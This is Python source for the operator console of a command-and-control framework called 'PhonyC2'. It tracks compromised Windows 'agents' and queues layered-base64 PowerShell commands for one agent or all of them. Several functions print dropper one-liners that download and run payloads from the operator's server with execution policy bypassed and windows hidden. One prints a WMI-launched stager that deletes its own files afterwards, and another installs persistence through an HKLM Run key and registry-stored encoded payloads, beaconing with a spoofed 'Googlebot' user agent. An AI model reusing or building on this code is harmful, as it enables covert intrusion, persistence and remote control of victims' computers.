import cmd
import datetime
import os
import sys
import base64
import requests
from isnotcore import config
from os import listdir
from os.path import isfile, join
import prettytable
from datetime import datetime
import time


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def to_my_encode(b64):
    b64 = b64.encode('utf-8')
    b64 = base64.b64encode(b64)
    b64 = base64.b64encode(b64)
    b64 = b64[::-1]
    b64 = base64.b64encode(b64)
    b64 = base64.b64encode(b64)
    return b64.decode('utf-8')


def to_b64(b64):
    b64 = b64.encode('utf-8')
    b64 = base64.b64encode(b64)
    return b64


def encode(b64):
    return base64.b64encode(b64.encode('UTF-16LE'))


class Commandline(cmd.Cmd):
    @staticmethod
    def do_exit(self):
        print("S33 y0u l4t3r")
        os._exit(0)
        #print('Ctrl+Z')
        #print("lsof -i:" + config.vps['port'] + " -Fp | head -n 1 | sed 's/^p//' | xargs kill -9")

    @staticmethod
    def empty_line(self):
        pass

    def do_setcommandforall(self, agent_id):
        powershell_cmd = input("PS > ")
        if powershell_cmd:
            print("PowerShell Command Set For All Agents")
            powershell_cmd = to_my_encode(powershell_cmd)
            #print(config.commands)
            print(len(config.commands))
            for i in range(1, ((len(config.commands)) +1)):
                #print(config.commands[i])
                #print(i)
                #print(config.commands)
                #print(config.commands[i])
                #print(config.commands[i][0])
                #print(config.commands[i][1])
                (config.commands[i][1]) = powershell_cmd
                #print("set => " + (config.commands[i][0]) + " :: " + (config.commands[i][0]))
                #print(config.commands)


    def do_use(self, agent_id):
        if agent_id == "":
            print("Syntax: use id")
        else:
            print("Agent " + str(agent_id) + " Selected")
            print(config.agents.get(int(agent_id)))
            useobj = UseCmd()
            useobj.UseCmd_agent_id = agent_id
            useobj.prompt = self.prompt[:-1] + '(AgentID:' + agent_id + "):"
            useobj.cmdloop()

    def do_list(self, person):
        table = prettytable.PrettyTable([bcolors.BOLD + 'ID' + bcolors.ENDC,
                                         bcolors.BOLD + 'PID' + bcolors.ENDC,
                                         bcolors.BOLD + 'USERDOMAIN' + bcolors.ENDC,
                                         bcolors.BOLD + 'COMPUTERNAME' + bcolors.ENDC,
                                         bcolors.BOLD + 'USERNAME' + bcolors.ENDC,
                                         bcolors.BOLD + 'Country' + bcolors.ENDC,
                                         bcolors.BOLD + 'ExternalIP' + bcolors.ENDC,
                                         bcolors.BOLD + 'Time' + bcolors.ENDC])
        table.border = False
        table.align = 'l'
        table.add_row(['-' * 3, '-' * 8, '-' * 20, '-' * 20, '-' * 20, '-' * 12, '-' * 12, '-' * 15])

        for i in config.agents:
            country = "getcountry"
            #print((config.ip_country))
            #print(len(config.ip_country))
            #print(config.ip_country[i])
            try:
                if config.ip_country[i]:
                    country = config.ip_country[i]
                    #print(country)
                else:
                    country = "Undefined"
            except:
                pass
            agent_time = time.time()
            timestamp = datetime.fromtimestamp(agent_time)
            later_time = str(timestamp.strftime('%Y-%m-%d %H:%M:%S'))
            #dt_object = datetime.fromtimestamp(config.times[i])
            #print(type(dt_object))
            #print(dt_object)
            #print(config.times[i])
            later_time = datetime.strptime(later_time, '%Y-%m-%d %H:%M:%S')
            #print(later_time)
            start_time = datetime.strptime(config.times[i], '%Y-%m-%d %H:%M:%S')
            difference = later_time - start_time
            #print(difference)
            seconds_in_day = 24 * 60 * 60
            timeout = divmod(difference.days * seconds_in_day + difference.seconds, 60)
            timeout = difference
            table.add_row([bcolors.OKBLUE + str(i) + bcolors.ENDC, config.commands[i][0], config.agents[i][0], config.agents[i][1],
                           config.agents[i][2], str(country), config.ips[i], timeout])
            #print(i)
            #print(config.agents[i])
            #print(str(i)+"||"+config.agents[i][0]+"||"+config.agents[i][1]+"||"+config.agents[i][2]+"||"+config.times[i])

        print(table)


    def do_droper(self,line):
        print("\033[1;32;40mdroper:\033[0m ")
        server = "http://" + config.vps['ip']+ ":" + config.vps['port']+ config.endpoints['GET_CORE_Binery']
        print("\033[1;32;40mInvoke-RestMethod_ENC:\033[0m ")
        print(config.InvokeRestMethod)
        print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(config.InvokeRestMethod)).decode("utf-8"))
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        print("\033[1;32;40mIWR_ENC:\033[0m ")
        print(config.IWR)
        print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(config.IWR)).decode("utf-8"))
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        print("\033[1;32;40mStart-BitsTransfer:\033[0m ")
        print(config.StartBitsTransfer)
        print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(config.StartBitsTransfer)).decode("utf-8"))
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        print("\033[1;32;40mHTTPWebRequest:\033[0m ")
        print(config.HTTPWebRequest)
        print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(config.HTTPWebRequest)).decode("utf-8"))


    def do_Ex3cut3(self,line):
        print("\033[1;32;40mEx3cut3:\033[0m ")
        print(config.cmd5_2)
        print("")
        print(config.cmd5_3)
        print("")
        print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(config.cmd5_3)).decode("utf-8"))
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        print("\033[1;32;40mIEX_TEST:\033[0m ")
        print("powershell -W n IEX(hostname)")
        print("powershell -W n I`E`X(hostname)")
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)


    def do_payload(self,line):
        #print("\033[1;32;40mOne_Line_BitsTransfer\033[0m ")
        #print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(config.One_Line_BitsTransfer)).decode("utf-8"))
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        #print("\033[1;32;40mCMD:\033[0m ")
        #print('echo ' + config.HEX_download.encode("utf-8").hex() + ' > c:\programdata\onlydigit.ini')
        #print("")
        #print("powershell -exec bypass -w 1 -enc " + (encode(config.HEX_CMD)).decode("utf-8"))
        #print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        print("\033[1;32;40mStart-Job:\033[0m ")
        #print(config.IWR_AND_RUN)
        print(config.Start_Jobs.replace("(ENCODEDCOMMAND)", (encode(config.IWR_AND_RUN)).decode("utf-8")))
        start_job_enc = (config.Start_Jobs.replace("(ENCODEDCOMMAND)", (encode(config.IWR_AND_RUN)).decode("utf-8")))
        print("")
        print("powershell -EP BYPASS -NoP -W 1 -EncodedCommand " + (encode(start_job_enc)).decode("utf-8"))
        print(bcolors.WARNING + "--------------------------------------------------------------------------------------------" + bcolors.ENDC)
        print("\033[1;32;40mStep_by_Step:\033[0m ")
        print("\033[1;32;40m(1) => Notice: (HTTPWebRequest Droper) \033[0m ")
        print('''Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri (server) -OutFile $input } -InputObject "c:\\programdata\\db.sqlite"'''.replace('(server)',config.server))
        print("\033[1;32;40m(2)\033[0m ")
        Bincode = config.to_one_base64(config.BinString.replace("[spiter_Array]",str(config.spiter_Array_string)))
        print('''Set-Content -Force -Path c:\\programdata\\db.ps1 -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bincide")))'''.replace("bincide",Bincode))
        print("\033[1;32;40m(3) => Notice: (She Open Your Eyes -WindowStyle Minimized instead of -W h )\033[0m ")
        print('''$pc = [wmiclass]'root\\cimv2:Win32_Process';$pc.Create('powershell -EP BYPASS -NoP -W h -file c:\\programdata\\db.ps1', '.',$null);sleep 5;rm c:\\programdata\\db.sqlite ; rm c:\\programdata\\db.ps1''')
        print('')
        print('''powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri (server) -OutFile $input } -InputObject "c:\\programdata\\db.sqlite";sleep 6'''.replace('(server)',config.server))
        print('')
        print('''powershell Start-Job -ScriptBlock {Invoke-WebRequest -UseDefaultCredentials -UseBasicParsing -Uri (server) -OutFile $input } -InputObject "c:\\programdata\\db.sqlite";sleep 6;Set-Content -Force -Path c:\\programdata\\db.ps1 -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bincide')));$pc = [wmiclass]'root\\cimv2:Win32_Process';$pc.Create('powershell -EP BYPASS -NoP -W h -file c:\\programdata\\db.ps1', '.',$null);sleep 5;rm c:\\programdata\\db.sqlite ; rm c:\\programdata\\db.ps1'''.replace('(server)',config.server).replace("bincide",Bincode))
        print('')

class UseCmd(cmd.Cmd):
    UseCmd_agent_id = ""
    def do_exit(self, person):
        sys.exit()

    def do_back(self, back):
        objeback = Commandline()
        objeback.prompt = "(PhonyC2:" + config.vps['ip'] + ":" + config.vps['port'] + "):"
        objeback.cmdloop()

    def emptyline(self):
        pass

    def do_shell(self, command):
        print("Windows PowerShell")
        while True:
            powershell_cmd = input("PS > ")
            if powershell_cmd == "exit":
                useobj = UseCmd()
                useobj.UseCmd_agent_id = self.UseCmd_agent_id
                useobj.prompt = self.prompt[:-1]
                useobj.cmdloop()
            else:
                if powershell_cmd:
                    print("PowerShell Command Set to Agent "+self.UseCmd_agent_id)
                    data_command = config.commands[int(self.UseCmd_agent_id)]
                #print(self.UseCmd_agent_id)
                #print(data_command)
                #print(powershell_cmd)
                #print((data_command + powershell_cmd))
                    powershell_cmd = to_my_encode(powershell_cmd)
                    #print(config.commands)
                    #print(int(self.UseCmd_agent_id))
                    #print(config.commands[int(self.UseCmd_agent_id)][1])
                    (config.commands[int(self.UseCmd_agent_id)][1]) = powershell_cmd
                #config.commands.update({int(self.UseCmd_agent_id): })
                else:
                    pass

    def do_persist(self, command):

        p_id = config.persist_RandomToken_genarator()
        data_command = config.commands[int(self.UseCmd_agent_id)]
        print("Persist Command Set TO PID " + str(data_command[0]) + " : \nGet Shell And Put This Commands:")
        persist_data = config.persist_encode_basehash_b52(config.p_core)
        # print(persist_data)
        persist_data = config.xor_crypt_string(persist_data, encode=True)
        # print(persist_data.decode('utf-8'))
        persist_data = config.persist_encode_basehash_b52(persist_data.decode('utf-8'))
        #print(config.persist_run)
        persist_run = config.persist_run
        #print(persist_run)
        persist_run = 'powershell -NoProfile -ExecutionPolicy Bypass -W 1 -encodedCommand ' + (encode(persist_run)).decode("utf-8")
        #print(persist_run)
        #persist_run = config.encode_hex(persist_run) //hex
        #print(persist_run)
        #persist_run_args = "/htg:htgstr".replace("htgstr",persist_run[::-1])
        #persist_run_args = persist_run[::-1] //reverse_Hex

        persist_cmd = 'New-Item -Path HKLM:\\Software -Name (KEY) -Force | Out-Null ;$p_id = "'+str(p_id)+'";$address = "'+str(config.only_server)+'";$UID = wmic path win32_computersystemproduct get uuid;$HDD = wmic diskdrive get serialnumber;$keyooo = ($UID | select-object -Index 2).Trim() +":" + ($HDD| select-object -Index 2);function HTTPGET($ad , $req){try{$r = [System.Net.HTTPWebRequest]::Create($ad+$req);$r.Method = "GET";$r.proxy = [Net.WebRequest]::GetSystemWebProxy();$r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;$r.KeepAlive = $false;$r.UserAgent = "Googlebot";$r.Headers.Add("Accept-Encoding", "identity");$rr = $r.GetResponse();$reqstream = $rr.GetResponseStream();$sr = New-Object System.IO.StreamReader $reqstream;$jj = $sr.ReadToEnd();$jj;}catch{Write-Host $_}};$gc = "'+config.endpoints['Persist']+'?"+$p_id+"="+$keyooo;$res = HTTPGET $address $gc;New-ItemProperty -Path "HKLM:SOFTWARE\\(KEY)" -Name "(FBI)" -Value "'+ str(persist_data) +'" -Force | Out-Null;'
        #persist_run = '''%ComSpec% start /c for /F "tokens=3" %A in ('reg query "HKCU\Software" /v "TEST"') DO (C:\\Windows\\System32\\spool\\PRINTERS\\0099.vbs %A)'''
        #persist_run_2 = '''%ComSpec% start /c C:\\Windows\\System32\\spool\\PRINTERS\\0099.cmd htgstr'''.replace("htgstr", persist_run[::-1])
        #persist_run = '''wmic computersystem list full /format:'C:\\Windows\\System32\\spool\\PRINTERS\\(xsl).xsl' '''.replace('(xsl)',config.persist_randomstring_for_xsl)
        #persist_run = '''WScript.CreateObject("WScript.Shell").Run("C:\\\\intel\\\\utils\\\\utils.vbs",0);'''
        persist_run = config.jse
        #print(persist_run_2)
        #persist_run_cmd = '''$path="C:\\Windows\\System32\\spool\\PRINTERS\\(jsefile).jse";$path2="C:\\Windows\\System32\\spool\\PRINTERS\\(xslfile).xsl";[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('(jse)'))| Out-File $path;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('(xsl)'))| Out-File $path2;schtasks /Create /F /RU system /SC DAILY /ST 10:01 /TN 'MicrosoftEdgeMachineCore' /TR "persist_run_2";schtasks.exe /Run /TN MicrosoftEdgeMachineCore;dir C:\\Windows\\System32\\spool\\PRINTERS\\'''.replace("MicrosoftEdgeMachineCore", config.Taskname_RandomToken).replace("(jse)", config.jse_bs64).replace("(xsl)", config.xsl_bs64)
        #persist_run_cmd = '''mkdir c:\\intel;cd c:\\intel;wget https://www.nirsoft.net/utils/nircmd.zip -OutFile c:\\intel\\utils.zip;Expand-Archive c:\\intel\\utils.zip -DestinationPath c:\\intel\\utils\\ -Force;rm utils.zip;cd c:\\intel\\utils\\;mv nircmd.exe utils.exe -Force;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('(cmd)'))| Out-File -Encoding ascii -Force c:\\intel\\utils\\utils.cmd;schtasks /Create /F /RU system /SC DAILY /ST 10:01 /TN 'OneDrive Reporting Task-S-1-5-21-8525444556-5656696-(id)-7878' /TR "c:\\intel\\utils\\utils.exe exec hide c:\\intel\\utils\\utils.cmd";'''.replace("(id)", config.Taskname_RandomToken).replace("(cmd)", config.to_b64(persist_run))
        persist_run_cmd = '''reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NEW /d C:\\intel\\utils\\utils.jse /f;mkdir c:\\intel\\utils\\ -f;cd c:\\intel\\utils\\;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('(cmd)'))| Out-File -Encoding ascii -Force c:\\intel\\utils\\utils.jse;New-ItemProperty -Path "HKLM:SOFTWARE\\(KEY)" -Name "(TEST)" -Value '(val)' -Force | Out-Null'''.replace("(id)", config.Taskname_RandomToken).replace("(cmd)", config.to_b64(persist_run)).replace('(val)',str(config.persist_run)).replace('(TEST)',config.persist_randomstring_for_TEST).replace('(KEY)',config.persist_randomstring_for_key)
        
        #persist_run_cmd = persist_run_cmd.replace('(xslfile)',config.persist_randomstring_for_xsl).replace('(jsefile)',config.persist_randomstring_for_jse)
        #print(persist_cmd.replace('(TEST)',config.persist_randomstring_for_TEST).replace('(FBI)',config.persist_randomstring_for_FBI).replace('(KEY)',config.persist_randomstring_for_key))
        persist_cmd = to_my_encode(persist_cmd.replace('(TEST)',config.persist_randomstring_for_TEST).replace('(FBI)',config.persist_randomstring_for_FBI).replace('(KEY)',config.persist_randomstring_for_key))
        #print(persist_cmd)
        (config.commands[int(self.UseCmd_agent_id)][1]) = persist_cmd
        #print(persist_run_cmd.replace("persist_run_2", persist_run))
        print(persist_run_cmd)
        #print("Check With LocalAdmin Right: schtasks.exe /Run /TN MicrosoftEdgeMachineCore")

    # def do_persistun(self, command):
    #     p_id = config.persist_RandomToken_genarator()
    #     data_command = config.commands[int(self.UseCmd_agent_id)]
    #     print("Persist Command Set TO PID " + str(data_command[0]) + " : \nGet Shell And Put This Commands:")
    #     persist_data = config.persist_encode_basehash_b52(config.p_core_un)
    #     persist_data = config.xor_crypt_string_un(persist_data, encode=True)
    #     persist_data = config.persist_encode_basehash_b52(persist_data.decode('utf-8'))
    #     persist_run = config.persist_run_un
    #     #print(persist_run)
    #     persist_run = 'powershell -exec bypass -WindowStyle Hidden -EncodedCommand ' + (encode(persist_run)).decode("utf-8")
    #     persist_run = config.encode_hex(persist_run)
    #     persist_run_args = persist_run[::-1]
    #     persist_cmd = '$p_id = "' + str(p_id) + '";$address = "' + str(config.only_server) + '";$UID = wmic path win32_computersystemproduct get uuid;$HDD = wmic diskdrive get serialnumber;$keyooo = ($UID | select-object -Index 2).Trim() +":" + ($HDD| select-object -Index 2);function HTTPGET($ad , $req){try{$r = [System.Net.HTTPWebRequest]::Create($ad+$req);$r.Method = "GET";$r.proxy = [Net.WebRequest]::GetSystemWebProxy();$r.proxy.Credentials = [Net.CredentialCache]::DefaultCredentials;$r.KeepAlive = $false;$r.UserAgent = "Googlebot";$r.Headers.Add("Accept-Encoding", "identity");$rr = $r.GetResponse();$reqstream = $rr.GetResponseStream();$sr = New-Object System.IO.StreamReader $reqstream;$jj = $sr.ReadToEnd();$jj;}catch{Write-Host $_}};$gc = "'+config.endpoints['Persist']+'?"+$p_id+"="+$keyooo;$res = HTTPGET $address $gc;New-ItemProperty -Path "HKCU:SOFTWARE" -Name "Assist" -Value "' + str(persist_data) + '" -Force | Out-Null;New-ItemProperty -Path "HKCU:SOFTWARE" -Name "Version" -Value "' + str(persist_run_args) + '" -Force | Out-Null'
    #     persist_run = '''wmic NIC get /format:'C:\\Windows\\System32\\spool\\PRINTERS\\0099.xsl' '''
    #     persist_run_cmd = '''$path="C:\\Windows\\System32\\spool\\PRINTERS\\0099.jse";$path2="C:\\Windows\\System32\\spool\\PRINTERS\\0099.xsl";[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('(jse)'))| Out-File $path;[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('(xsl)'))| Out-File $path2;schtasks /Create /F /RU system /SC DAILY /ST 11:11 /TN 'MicrosoftEdgeMachineCore' /TR "persist_run_2";schtasks.exe /Run /TN MicrosoftEdgeMachineCore '''.replace("MicrosoftEdgeMachineCore", config.Taskname_RandomToken).replace("(jse)", config.jse_bs64_un).replace("(xsl)", config.xsl_bs64)
    #     persist_cmd = to_my_encode(persist_cmd)
    #     (config.commands[int(self.UseCmd_agent_id)][1]) = persist_cmd
    #     print(persist_run_cmd.replace("persist_run_2", persist_run))

    def do_upload(self, command):
        only_files = [f for f in listdir("./file/") if isfile(join('./file/', f))]
        #print(only_files)
        if str(command) in only_files:
            #print(str(command))
            config.upload_tokens = str(config.random_str(10))
            data_command = config.commands[int(self.UseCmd_agent_id)][0]
            #print(data_command)
            upload_cmd = 'upload ' + "http*//" + config.vps['ip'] + "*" + config.vps['port'] + config.endpoints['download'] + str(command) +"|"+ str(data_command) +str(config.upload_tokens)
            print(upload_cmd)
            powershell_cmd = to_my_encode(upload_cmd)
            (config.commands[int(self.UseCmd_agent_id)][1]) = powershell_cmd
            #config.commands.update({int(self.UseCmd_agent_id): (data_command + str(upload_cmd))})
        else:
            print("\033[1;32;40m Bad File name \033[0m")

    def do_info(self, command):
        print("\033[1;32;40m Agent Information: \033[0m")
        print(config.agents.get(int(self.UseCmd_agent_id)))


    def do_sleep(self, command):
        data_command = config.commands[int(self.UseCmd_agent_id)][0]
        timer_cmd = 'timer ' + str(command)
        secend = timer_cmd.split(" ")[1]
        print("Sleep Mode Timer " + str(secend) + "s")
        powershell_cmd = to_my_encode(timer_cmd)
        (config.commands[int(self.UseCmd_agent_id)][1]) = powershell_cmd

    def do_listfile(self, command):
        onlyfiles = [f for f in listdir("./file/") if isfile(join('./file/', f))]
        print(onlyfiles)

    def do_getcountry(self, command):
        ip = config.ips.get(int(self.UseCmd_agent_id))
        #print(ip)
        ipapi = "https://ipapi.co/" + str(ip) + "/country_name/"
        x = requests.get(ipapi)
        ipapi_country = str(x.text)
        if x.status_code == 200:
            config.ip_country.update({int(self.UseCmd_agent_id): str(ipapi_country)})
        else:
            ipapi_country = "Undefined"
            config.ip_country.update({int(self.UseCmd_agent_id): str(ipapi_country)})
        #print(config.ip_country)
        print(str(ip) + " From " + str(ipapi_country))